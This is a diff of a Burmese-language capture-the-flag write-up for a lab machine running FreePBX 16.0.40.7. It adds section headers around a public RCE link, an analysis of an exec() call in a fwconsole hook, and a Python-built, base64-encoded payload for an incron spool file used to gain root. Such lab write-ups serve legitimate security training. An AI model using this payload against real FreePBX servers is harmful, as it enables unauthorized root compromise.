@@ -10,6 +10,8 @@ cover = '/images/connected/connected.png'
 
 ဒီမှာဆိုရင် machine လေးစလိုက်ပြီးရင် ip ‌လေးရလာပါလိမ့်မယ် vpn ချိတ်ပြီးရင် 
 
+## Recon
+
 > ping machine_ip
 ```bash 
 PING machine_ip (machine_ip) 56(84) bytes of data.
@@ -45,6 +47,8 @@ nmap နဲ့စပြီး port scan ပါမယ်
 
 website ရဲ့အောက်ဆုံးနားလေးကို သတိထားကြည့်ပါ freepbx 16.0.40.7 ဆိုတာလေးကိုတွေ့ပါလိမ့်မယ် 
 အဲ့ဒီတော့ public exploit ကိုရှာကြည့်လိုက်တဲ့အခါမှာ 
+
+## User Exploit
 
 [freerbpx 16.0.40.7 RCE ](https://www.exploit-db.com/exploits/52031)
 
@@ -114,6 +118,8 @@ OeTzGRhFQueT  user.txt
 ```
 
 ခုဆိုရင် cat user.txt လုပ်လိုက်ရုံနဲ့ user flag လေးရလာပါပြီ privilege escalation လုပ်ဖို့အတွက် path တွေလိုက်ရှာပါမယ်
+
+## Privilege Escalation Analysis 
 
 ![image](/images/connected/4.png)
 
@@ -185,6 +191,7 @@ $cmd = "/usr/sbin/fwconsole $command 2>&1";
 $result = exec($cmd, $output, $return);
 ```
 
+## ROOT EXPLOIT 
 now time to create payload
 > /var/spool/asterisk/incron/api.fwconsole-commands.payload 
 
@@ -205,6 +212,8 @@ payload = base64.b64encode(
 
 print(payload)
 ```
+
+> ဘာလို့ခုလိုမျိုး python payload create ဖို့သိတာလဲဆိုရင် အပေါ်မှာ /var/www/html/admin/modules/api/hooks/fwconsole-commands ဒီ file analyse ပြီးသိလာတာပဲဖြစ်ပါတယ်
 
 ``` plain
 eJyLVspMsVbQT8rM008ugNBJicUZCvpliUX65eXl+hkluTn6xRmlRYm6JaVFJTmpMNUZufkpCqXaxXiUKukoKJVU5CnFAgAGdyNc
